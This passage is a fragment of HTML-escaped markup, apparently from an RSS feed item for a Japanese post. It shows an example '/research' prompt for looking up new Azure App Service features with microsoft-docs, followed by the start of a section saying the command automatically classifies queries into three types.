+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/research microsoft-docs ツールを使って Azure App Service の新機能を調査してください
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="3-つのクエリ分類"&gt;3 つのクエリ分類&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;/research&lt;/code&gt; はクエリを自動分類し、回答形式を最適化します。&lt;/p&gt;</description></item></channel></rss>
